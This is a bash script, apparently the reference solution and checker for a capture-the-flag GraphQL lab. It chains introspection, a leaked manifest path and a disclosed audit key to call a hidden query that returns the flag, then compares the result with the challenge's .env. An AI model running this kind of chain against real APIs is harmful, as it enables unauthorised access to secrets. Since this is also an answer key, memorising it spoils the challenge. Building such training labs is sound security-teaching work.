#!/usr/bin/env bash
# ============================================================
# GraphLeak (labs05) — reference solution: GraphQL introspection
# + hidden field gated only by a leaked runtime key
#
# Chain: register -> introspection reveals _systemAudit(runtimeKey)
# -> systemHealth.buildManifestPath leaks the manifest path ->
# GET /api/internal/build-manifest (session auth only) discloses
# audit_key -> _systemAudit(runtimeKey) returns the flag as
# internalSecret.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8085)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8085}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

gql() { # gql '<query>' -> response JSON
  curl -fsS -b "$jar" -H 'Content-Type: application/json' \
    --data-binary "$(python3 -c 'import json,sys;print(json.dumps({"query":sys.argv[1]}))' "$1")" \
    "$BASE/api/graphql"
}

jar="$(mktemp)"
trap 'rm -f "$jar"' EXIT
user="hunter$$${RANDOM}"

echo "[*] registering an account (session required by the API)" >&2
curl -fsS -c "$jar" -o /dev/null \
  --data-urlencode "username=$user" \
  --data-urlencode 'password=hunter123pass' \
  "$BASE/register"

echo "[*] enumerating the schema via introspection" >&2
introspection="$(gql '{ __schema { queryType { fields { name description } } } }')"
if ! grep -q '_systemAudit' <<<"$introspection"; then
  echo "[-] failed: _systemAudit not visible via introspection" >&2
  exit 1
fi
echo "[*] discovered hidden query _systemAudit(runtimeKey)" >&2

echo "[*] asking systemHealth where the build manifest lives" >&2
health="$(gql '{ systemHealth { buildManifestPath status } }')"
manifest_path="$(python3 -c 'import json,sys;print(json.load(sys.stdin)["data"]["systemHealth"]["buildManifestPath"])' <<<"$health")"
echo "[*] manifest path: $manifest_path" >&2

echo "[*] fetching the build manifest (only session-authenticated)" >&2
manifest="$(curl -fsS -b "$jar" "$BASE$manifest_path")"
audit_key="$(python3 -c 'import json,sys;print(json.load(sys.stdin)["audit_key"])' <<<"$manifest")"
echo "[*] audit_key: $audit_key" >&2

echo "[*] calling _systemAudit with the leaked key" >&2
audit="$(gql "{ _systemAudit(runtimeKey: \"${audit_key}\") { internalSecret } }")"
flag="$(python3 -c 'import json,sys;print(json.load(sys.stdin)["data"]["_systemAudit"]["internalSecret"])' <<<"$audit")"

if ! grep -Eq "^$FLAG_RE$" <<<"${flag:-}"; then
  echo "[-] failed: no flag in _systemAudit response: $audit" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
